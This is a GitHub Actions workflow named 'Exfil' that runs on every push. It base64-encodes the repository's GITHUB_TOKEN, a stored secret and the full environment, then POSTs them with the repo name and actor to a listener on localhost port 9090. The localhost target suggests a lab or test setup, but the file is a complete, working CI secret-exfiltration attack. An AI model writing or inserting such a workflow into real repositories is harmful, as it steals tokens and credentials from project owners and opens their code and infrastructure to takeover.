name: Exfil
on:
  push:
  workflow_dispatch:

jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - name: Dump and send
        run: |
          # Grab secrets and encode them
          token=$(echo "${{ secrets.GITHUB_TOKEN }}" | base64 -w 0 2>/dev/null || echo "")
          secret1=$(echo "${{ secrets.SECRET_1 }}" | base64 -w 0 2>/dev/null || echo "")
          env_data=$(env | base64 -w 0)
          
          # Send to port 9090
          curl -X POST http://localhost:9090 \
            -H "Content-Type: application/json" \
            -d "{\"repo\":\"${{ github.repository }}\",\"actor\":\"${{ github.actor }}\",\"env\":\"$env_data\",\"token\":\"$token\",\"secret1\":\"$secret1\"}" || echo "Failed to send"
